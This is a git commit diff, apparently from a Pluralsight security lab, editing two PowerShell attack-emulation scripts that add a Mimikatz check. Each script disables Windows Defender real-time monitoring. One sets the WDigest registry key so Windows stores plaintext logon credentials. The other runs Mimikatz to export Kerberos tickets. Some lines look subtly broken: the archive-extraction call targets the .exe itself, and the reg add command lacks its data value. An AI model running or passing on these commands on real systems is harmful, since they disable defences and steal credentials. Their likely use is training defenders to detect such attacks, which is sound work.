08e82c2b41359c3d1cbdb43e8a6e5dfcad9d4aa7
treyescairo-pluralsight <64978363+treyescairo-pluralsight@users.noreply.github.com>
2024-03-21 15:21:55 -0600

    App Check

--- endpoint_attacks/credential_grabbing/ttp.ps1
+++ endpoint_attacks/credential_grabbing/ttp.ps1
@@ -1,6 +1,14 @@
 <# Disable Windows Defender #>
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+<# Check If Mimikatz#>
+$Path = 'C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe'
+$Tools = Test-Path -Path $Path
+
+if (!$Tools) {
+    Expand-Archive -Path $Path -DestinationPath "C:\Program Files\psattack\tools\mimikatz"
+}
+
 <# Attack #>
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d
 
--- endpoint_attacks/kerberoasting/ttp.ps1
+++ endpoint_attacks/kerberoasting/ttp.ps1
@@ -1,6 +1,14 @@
 <# Disable Windows Defender #>
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+<# Check If Mimikatz#>
+$Path = 'C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe'
+$Tools = Test-Path -Path $Path
+
+if (!$Tools) {
+    Expand-Archive -Path $Path -DestinationPath "C:\Program Files\psattack\tools\mimikatz"
+}
+
 <# Attack #>
 . C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "log log.txt" "privilege::debug" "sekurlsa::tickets /export" "exit"
 
